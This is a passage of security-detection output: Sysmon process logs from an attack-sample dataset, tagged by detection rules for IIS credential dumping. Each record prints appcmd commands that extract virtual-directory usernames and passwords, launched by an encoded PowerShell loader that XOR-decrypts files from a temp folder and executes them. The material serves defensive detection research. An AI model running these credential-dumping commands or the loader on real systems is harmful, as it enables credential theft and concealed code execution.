gBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3640
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-001072D7FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.924
"
2019-05-27T01:29:20.034674+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5976,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 1900
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-001032DBFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Description: Cannot read configuration file due to insufficient permissions"" /text:userName'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.994
"
2019-05-27T01:29:20.124804+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5979,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2772
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D70-5CEB-0000-0010F2DEFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Description: Cannot read configuration file due to insufficient permissions"" /text:password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:20.084
"
2019-05-27T01:29:20.204919+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5982,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2108
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D70-5CEB-0000-0010B2E2FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:userName'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:20.164
"
